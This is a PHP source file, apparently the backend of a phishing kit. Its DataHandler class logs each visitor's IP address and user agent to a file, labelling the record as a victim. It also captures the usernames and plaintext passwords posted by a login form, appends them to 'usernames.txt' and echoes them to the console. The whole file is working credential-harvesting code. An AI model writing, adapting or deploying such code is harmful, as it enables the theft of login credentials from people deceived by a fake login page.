<?php

abstract class DataHandler
{
    public static function logIp()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }
        $useragent = $_SERVER['HTTP_USER_AGENT'];


        $file = __DIR__ . '/../../conected_ips.txt';
        $victim = "\nIP: ";
        $fp = fopen($file, 'a');

        fwrite($fp, $victim);
        fwrite($fp, $ipaddress);
        fwrite($fp, $useragent);

        self::logToConsole(json_encode([
            'tag'       => 'connection',
            'ip'        => $ipaddress,
            'useragent' => $useragent,
        ]));


        fclose($fp);
    }

    public static function logLogin()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }

        $data = json_decode(file_get_contents('php://input'), true);
        file_put_contents(
            __DIR__ . '/../../usernames.txt',
            "IP: $ipaddress\n" .
            "Username: {$data['user']}\n" .
            "Pass: {$data['pass']}\n" .
            "——————————————————————————————————\n",
            FILE_APPEND
        );
        
        self::logToConsole(json_encode([
            'tag'  => 'login',
            'ip'   => $ipaddress,
            'user' => $data['user'],
            'pass' => $data['pass'],
        ]));
    }

    private static function logToConsole($string)
    {
        fwrite(fopen('php://stdout', 'w'), "[" . date('D M d H:i:s Y') . "][DataHandler]: $string\n");
    }
}
